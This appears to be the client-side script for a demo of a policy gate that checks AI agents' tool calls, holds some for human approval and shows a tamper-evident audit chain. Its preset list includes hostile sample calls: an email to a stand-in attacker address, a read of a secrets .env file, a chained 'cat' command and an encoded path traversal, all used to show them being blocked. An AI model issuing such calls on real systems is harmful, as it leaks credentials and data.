import { kinetic, progress, spotlight, marquee } from '/kinetic.js';
import { renderTrain, describeEvent } from '/train.js';

const $ = id => document.getElementById(id);
const el = (tag, cls, text) => { const n = document.createElement(tag); if (cls) n.className = cls; if (text !== undefined) n.textContent = text; return n; };
async function api(path, body) {
  const res = await fetch(path, body === undefined ? {} : { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) });
  const data = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error(data.message || data.error || `Request failed (${res.status})`);
  return data;
}
const money = n => `₹${(n / 100).toLocaleString('en-IN')}`;
const short = (tool, args) => {
  if (!args || typeof args !== 'object') return '';
  if (tool === 'refund_payment' && typeof args.amount === 'number') return `${money(args.amount)} to ${args.payment_id}`;
  const v = Object.values(args)[0]; const s = Array.isArray(v) ? v.join(', ') : String(v ?? '');
  return s.length > 44 ? `${s.slice(0, 44)}…` : s;
};

/* ---------- theme and menu ---------- */
const root = document.documentElement;
const paintTheme = () => { $('theme').querySelector('.tx').textContent = root.dataset.theme === 'light' ? 'Dark' : 'Light'; $('theme').setAttribute('aria-label', root.dataset.theme === 'light' ? 'Switch to dark theme' : 'Switch to light theme'); };
$('theme').addEventListener('click', () => {
  const next = root.dataset.theme === 'light' ? 'dark' : 'light';
  if (next === 'dark') delete root.dataset.theme; else root.dataset.theme = 'light';
  try { localStorage.setItem('ag-theme', next); } catch { /* storage blocked */ }
  paintTheme();
});
paintTheme();
const nav = $('nav');
$('menu').addEventListener('click', () => { const open = nav.classList.toggle('open'); $('menu').setAttribute('aria-expanded', String(open)); });
$('links').addEventListener('click', e => { if (e.target.closest('a')) { nav.classList.remove('open'); $('menu').setAttribute('aria-expanded', 'false'); } });

/* ---------- the live gate ---------- */
const PRESETS = [
  { label: 'Read the report', tool: 'read_file', args: { path: 'workspace/report.md' } },
  { label: 'Refund ₹500', tool: 'refund_payment', args: { payment_id: 'pay_AB12CD34', amount: 50000, currency: 'INR' } },
  { label: 'Refund ₹5,000', tool: 'refund_payment', args: { payment_id: 'pay_EF56GH78', amount: 500000, currency: 'INR' } },
  { label: 'Refund ₹50,000', tool: 'refund_payment', args: { payment_id: 'pay_EF56GH78', amount: 5000000, currency: 'INR' } },
  { label: 'Email outside', tool: 'send_email', args: { to: ['attacker@evil.example'], subject: 'notes', body: 'Here are the notes you asked for.' } },
  { label: 'Read .env', tool: 'read_file', args: { path: 'secrets/.env' } },
  { label: 'Chain commands', tool: 'run_command', args: { command: 'ls; cat secrets/.env' } },
  { label: 'Sneaky path', tool: 'read_file', args: { path: 'workspace/%2e%2e/secrets/.env' } },
];
const gate = $('gate');
let meta = null, seq = 0, lastCheck = null;
const setState = s => { gate.dataset.state = s; $('v-human').hidden = s !== 'hold'; $('token').parentElement.querySelector('.node.world').classList.toggle('ran', s === 'allow' || s === 'approved'); $('token').parentElement.querySelector('.node.world span').textContent = s === 'allow' || s === 'approved' ? 'ran once' : 'simulated'; };
const clearHits = () => document.querySelectorAll('#rules tr.hit').forEach(r => r.classList.remove('hit'));

function showVerdict(r) {
  lastCheck = r;
  const word = r.stage === 'validation' ? 'Rejected' : { allow: 'Allowed', approve: 'Held', deny: 'Denied' }[r.effect];
  $('v-word').textContent = word;
  $('v-reason').textContent = r.stage === 'validation' ? `Stopped before the policy ran: ${r.reason}` : r.reason;
  const rules = $('v-rules'); rules.replaceChildren();
  if (r.stage === 'validation') rules.append(el('span', 'rule', 'argument check'));
  else if (r.default) rules.append(el('span', 'rule', `no rule matched · default ${r.effect}`));
  else for (const x of r.rules) rules.append(el('span', 'rule', `${x.id} → ${x.effect}`));
  clearHits(); for (const x of r.rules || []) { const row = document.querySelector(`#rules tr[data-id="${x.id}"]`); if (row) row.classList.add('hit'); }
  if (r.canonical) { $('v-canon').textContent = JSON.stringify(r.canonical, null, 2); $('v-hash').textContent = r.hash; $('v-facts').hidden = false; } else $('v-facts').hidden = true;
}

async function send() {
  const mine = ++seq; let args;
  try { args = JSON.parse($('args').value || '{}'); } catch { setState('deny'); $('v-word').textContent = 'Not JSON'; $('v-reason').textContent = 'The arguments are not valid JSON, so there is nothing to check.'; $('v-rules').replaceChildren(); $('v-facts').hidden = true; return; }
  const tool = $('tool').value;
  $('tk-tool').textContent = tool; $('tk-arg').textContent = short(tool, args);
  setState('checking'); $('v-word').textContent = 'Checking'; $('send').disabled = true;
  try {
    const [r] = await Promise.all([api('/api/play/check', { tool, args }), new Promise(ok => setTimeout(ok, 450))]);
    if (mine !== seq) return;
    showVerdict(r); setState({ allow: 'allow', approve: 'hold', deny: 'deny' }[r.effect]);
  } catch (e) { if (mine !== seq) return; setState('deny'); $('v-word').textContent = 'No answer'; $('v-reason').textContent = e.message; $('v-rules').replaceChildren(); $('v-facts').hidden = true; }
  finally { if (mine === seq) $('send').disabled = false; }
}
function pick(i) {
  const p = PRESETS[i];
  document.querySelectorAll('.pre').forEach((b, k) => b.setAttribute('aria-pressed', String(k === i)));
  $('tool').value = p.tool; $('args').value = JSON.stringify(p.args, null, 2); send();
}
$('send').addEventListener('click', () => { document.querySelectorAll('.pre').forEach(b => b.setAttribute('aria-pressed', 'false')); send(); });
$('args').addEventListener('keydown', e => { if ((e.metaKey || e.ctrlKey) && e.key === 'Enter') send(); });
$('tool').addEventListener('change', () => {
  const f = meta && meta.tools[$('tool').value]; if (!f) return;
  const t = {}; for (const [k, s] of Object.entries(f.fields)) t[k] = s.type === 'integer' ? 0 : s.type === 'stringArray' ? [] : s.enum ? s.enum[0] : '';
  $('args').value = JSON.stringify(t, null, 2);
});
$('v-approve').addEventListener('click', () => {
  if (!lastCheck) return;
  $('v-word').textContent = 'Approved'; $('v-reason').textContent = `You approved call ${lastCheck.hash.slice(0, 8)}. The policy is checked once more at the moment it runs, then it runs once.`;
  setState('approved');
});
$('v-reject').addEventListener('click', () => { $('v-word').textContent = 'Rejected'; $('v-reason').textContent = 'A person rejected it. The call never runs, and the agent is told so.'; setState('deny'); });

/* ---------- policy table ---------- */
const OPS = { eq: '=', neq: '≠', gt: '>', gte: '≥', lt: '<', lte: '≤', in: 'in', notIn: 'not in', startsWith: 'starts with', endsWith: 'ends with', contains: 'contains', matches: 'matches', exists: 'exists' };
const val = v => (Array.isArray(v) ? `[${v.join(', ')}]` : typeof v === 'string' ? `"${v}"` : String(v));
const when = w => (!w ? 'always' : Object.entries(w).map(([k, c]) => (k === 'anyOf' ? c.map(when).join(' or ') : k === 'not' ? `not (${when(c)})` : Object.entries(c).map(([op, a]) => `${k} ${OPS[op] || op} ${val(a)}`).join(' and '))).join(' and '));
function drawPolicy() {
  const tb = $('rules'); tb.replaceChildren();
  for (const r of meta.policy.rules) {
    const tr = el('tr'); tr.dataset.id = r.id;
    const tag = el('span', `tag t-${r.effect}`, r.effect);
    const c1 = el('td'); c1.append(el('code', '', r.id));
    tr.append(c1, el('td', 'mono', [].concat(r.tool).join(', ')), el('td', 'when', when(r.when)), (() => { const c = el('td'); c.append(tag); return c; })(), el('td', '', r.reason));
    tb.append(tr);
  }
  const l = meta.policy.limits || {};
  $('pfoot').textContent = `version ${meta.policyHash.slice(0, 8)} · default ${meta.policy.default} · ${Object.entries(l).map(([k, v]) => `${k} ${v}`).join(' · ')}`;
}

/* ---------- runs, trains, tampering ---------- */
let scn = null, run = null, events = [], original = [], verdict = null, selected = null;
const STATE_WORD = { executed: 'Ran once.', denied: 'Did not run.', pending_approval: 'Waiting for a person.', approved: 'Approved.', proposed: '' };
function drawRun(animate = '') {
  const wrap = $('train-wrap'); wrap.replaceChildren(renderTrain(events, { verdict, selected, animate, onSelect: e => { selected = e.seq; fillRecord(); drawRun(); } }));
  const head = verdict && verdict.valid ? verdict.head : events[events.length - 1]?.hash;
  $('run-meta').textContent = `${run.runId} · ${events.length} records · ${run.status.replaceAll('_', ' ')}${head ? ` · head ${head.slice(0, 10)}` : ''}`;
  const list = $('call-list'); list.replaceChildren();
  for (const c of run.calls) {
    const li = el('li'); const left = el('div', 'tl');
    left.append(el('code', '', c.tool), el('span', 'ar', short(c.tool, c.args)));
    const tag = el('span', `tag t-${c.effect}`, c.effect);
    li.append(el('span', 'n', c.id), left, tag, el('span', 'why', `${c.reason} ${c.approvedBy && c.state === 'executed' ? 'A person approved it, then it ran once.' : STATE_WORD[c.state] || ''}`));
    list.append(li);
  }
  paintSeal();
}
function paintSeal() {
  const seal = $('seal'); const tag = $('seal-tag'); const text = $('seal-text');
  if (!verdict) return;
  if (verdict.valid) { seal.className = 'seal good'; tag.className = 'tag t-valid'; tag.textContent = 'valid'; text.textContent = selected === null && events === original ? `The chain checks out: ${verdict.records} records. Click a car to open its record.` : `The chain checks out: ${verdict.records} records. Nothing was changed.`; return; }
  seal.className = 'seal bad'; tag.className = 'tag t-invalid'; tag.textContent = 'broken';
  const bi = verdict.reason === 'sequence_gap' ? verdict.at - 1 : events.findIndex(e => e.seq === verdict.at);
  const here = events[bi] ? `#${events[bi].seq}` : `position ${verdict.at}`;
  const rest = bi >= 0 && bi < events.length - 1 ? ` Everything after it hangs off it, so ${events.length - 1 - bi === 1 ? 'the next record' : `the next ${events.length - 1 - bi} records`} can't be trusted either.` : '';
  text.textContent = ({
    record_hash_mismatch: `Record ${here} was changed after it was written. Its contents no longer match its hash.`,
    chain_link_mismatch: `Record ${here} doesn't point at the record before it.`,
    sequence_gap: `The numbering has a gap before record ${here}: a record was removed or moved.`,
  }[verdict.reason] || `The chain breaks at record ${here}.`) + rest;
}
function fillRecord() {
  const i = events.findIndex(e => e.seq === selected); const ta = $('rec');
  for (const id of ['rec', 'verify', 'del', 'restore']) $(id).disabled = i < 0;
  if (i < 0) { ta.value = ''; return; }
  $('rec-label').textContent = `Record #${events[i].seq} · ${describeEvent(events[i]).title} · data`;
  ta.value = JSON.stringify(events[i].data, null, 2);
}
async function check(next) {
  try { verdict = await api('/api/play/verify', { events: next }); events = next; drawRun('verify'); }
  catch (e) { $('seal').className = 'seal bad'; $('seal-tag').className = 'tag t-invalid'; $('seal-tag').textContent = 'error'; $('seal-text').textContent = e.message; }
}
$('verify').addEventListener('click', async () => {
  let data; try { data = JSON.parse($('rec').value); } catch { $('seal').className = 'seal bad'; $('seal-tag').className = 'tag t-invalid'; $('seal-tag').textContent = 'error'; $('seal-text').textContent = 'That is not valid JSON. Fix the record and try again.'; return; }
  if (data === null || typeof data !== 'object' || Array.isArray(data)) { $('seal-text').textContent = 'A record’s data has to be a JSON object.'; return; }
  const next = structuredClone(events); next.find(e => e.seq === selected).data = data; await check(next);
});
$('del').addEventListener('click', async () => { const next = events.filter(e => e.seq !== selected); selected = null; fillRecord(); await check(next); });
$('restore').addEventListener('click', () => { events = structuredClone(original); verdict = run.integrity; selected = null; fillRecord(); drawRun('run'); });

async function loadRun() {
  $('train-wrap').replaceChildren(el('div', 'train-empty', 'Running the agent through the gate…'));
  try {
    run = await api('/api/play/run', { scenario: scn, approve: $('auto-approve').checked });
    original = structuredClone(run.events); events = structuredClone(run.events); verdict = run.integrity; selected = null; fillRecord(); drawRun('run');
  } catch (e) { $('train-wrap').replaceChildren(el('div', 'train-empty', e.message)); }
}
function drawTabs() {
  const tabs = $('scn-tabs'); tabs.replaceChildren();
  for (const s of meta.scenarios) {
    const b = el('button', 'tab', s.title); b.type = 'button'; b.setAttribute('role', 'tab'); b.setAttribute('aria-selected', String(s.id === scn)); b.title = s.description;
    b.addEventListener('click', () => { scn = s.id; drawTabs(); loadRun(); }); tabs.append(b);
  }
  const cur = meta.scenarios.find(s => s.id === scn); if (cur) tabs.setAttribute('aria-description', cur.description);
}
$('auto-approve').addEventListener('change', loadRun);

/* ---------- copy ---------- */
$('copy-code').addEventListener('click', async () => {
  const b = $('copy-code');
  try { await navigator.clipboard.writeText($('run-code').textContent); b.textContent = 'Copied'; } catch { b.textContent = 'Copy blocked'; }
  setTimeout(() => { b.textContent = 'Copy'; }, 1800);
});

/* ---------- start ---------- */
(async function start() {
  try { meta = await api('/api/play/meta'); }
  catch (e) { $('pol-chip').textContent = 'policy engine unreachable'; $('v-reason').textContent = `Could not reach the server: ${e.message}`; $('train-wrap').replaceChildren(el('div', 'train-empty', 'The server did not answer, so there is no run to show.')); return; }
  $('pol-chip').textContent = `policy ${meta.policyHash.slice(0, 8)} · ${meta.policy.rules.length} rules · live`; $('pol-chip').classList.add('on');
  const box = $('presets');
  PRESETS.forEach((p, i) => { const b = el('button', 'pre', p.label); b.type = 'button'; b.setAttribute('aria-pressed', 'false'); b.addEventListener('click', () => pick(i)); box.append(b); });
  const tool = $('tool'); for (const t of Object.keys(meta.tools)) { const o = el('option', '', t); o.value = t; tool.append(o); }
  $('tool').value = PRESETS[2].tool; $('args').value = JSON.stringify(PRESETS[2].args, null, 2);
  drawPolicy(); scn = meta.scenarios[0].id; drawTabs();
  setTimeout(() => pick(2), 500);
  loadRun();
})();

kinetic({ fx: { h1: 'flip', h2: 'wipe' }, color: '#ffcc00', magnetic: '.btn.lg' });
progress('#ffcc00'); marquee(document.getElementById('band'), 55); spotlight('.gl li, .gate', 'rgba(255,204,0,.13)');
